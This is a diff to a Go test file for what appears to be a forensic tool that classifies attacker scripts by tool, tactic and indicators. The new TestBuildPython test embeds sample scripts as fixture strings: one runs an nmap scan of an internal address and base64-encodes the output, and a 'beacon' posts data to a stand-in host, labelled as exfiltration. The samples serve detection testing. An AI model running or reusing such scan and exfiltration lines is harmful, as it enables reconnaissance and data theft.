@@ -32,7 +32,7 @@ func loadTables(t *testing.T) Tables {
 
 func TestBuildBash(t *testing.T) {
 	folder := evidencetest.Copy(t, "bash")
-	res, err := inventory.ReadAll(folder)
+	res, err := inventory.ReadAll(folder, 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -57,7 +57,7 @@ func TestBuildBash(t *testing.T) {
 
 func TestBuildHasToolsAndTactics(t *testing.T) {
 	folder := evidencetest.Copy(t, "bash")
-	res, err := inventory.ReadAll(folder)
+	res, err := inventory.ReadAll(folder, 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -83,7 +83,7 @@ func TestBuildHasToolsAndTactics(t *testing.T) {
 
 func TestBuildHasIndicators(t *testing.T) {
 	folder := evidencetest.Copy(t, "bash")
-	res, err := inventory.ReadAll(folder)
+	res, err := inventory.ReadAll(folder, 0)
 	if err != nil {
 		t.Fatal(err)
 	}
@@ -140,9 +140,52 @@ func TestLinkOutputsByBaseName(t *testing.T) {
 	}
 }
 
+func TestBuildPython(t *testing.T) {
+	files := []evidence.File{
+		{Path: "scan.py", Role: evidence.Script},
+		{Path: "beacon", Role: evidence.Script},
+		{Path: "scan.txt", Role: evidence.Output},
+	}
+	texts := map[string]string{
+		"scan.py": "import subprocess, base64\n" +
+			"OUT = \"scan.txt\"\n" +
+			"subprocess.run([\"nmap\", \"-sV\", \"10.20.1.5\", \"-oN\", OUT])\n" +
+			"blob = base64.b64encode(open(OUT, \"rb\").read())\n",
+		"beacon": "#!/usr/bin/env python3\nimport requests\nrequests.post(\"http://10.20.1.9/up\", data=b\"x\")\n",
+	}
+	tables := loadTables(t)
+	steps := map[string]Step{}
+	for _, s := range Build(files, texts, tables).Steps {
+		steps[s.File.Path] = s
+	}
+	cases := []struct {
+		path, tool, tactic string
+	}{
+		{"scan.py", "nmap", "Discovery"},
+		{"scan.py", "subprocess.run", "Execution"},
+		{"beacon", "requests.post", "Exfiltration"},
+	}
+	for _, c := range cases {
+		s := steps[c.path]
+		if !slices.Contains(s.Tools, c.tool) || !slices.Contains(s.Tactics, c.tactic) {
+			t.Errorf("%s: tools %v tactics %v, want %s and %s", c.path, s.Tools, s.Tactics, c.tool, c.tactic)
+		}
+		if s.Indicators == 0 {
+			t.Errorf("%s: no indicators", c.path)
+		}
+	}
+	scan := steps["scan.py"]
+	if !slices.Contains(scan.Transforms, "Base64Encode") {
+		t.Errorf("scan.py transforms = %v, want Base64Encode", scan.Transforms)
+	}
+	if len(scan.Outputs) != 1 || scan.Outputs[0] != "scan.txt" {
+		t.Errorf("scan.py outputs = %v, want [scan.txt]", scan.Outputs)
+	}
+}
+
 func TestBuildWithWatchlist(t *testing.T) {
 	folder := evidencetest.Copy(t, "bash")
-	res, err := inventory.ReadAll(folder)
+	res, err := inventory.ReadAll(folder, 0)
 	if err != nil {
 		t.Fatal(err)
 	}
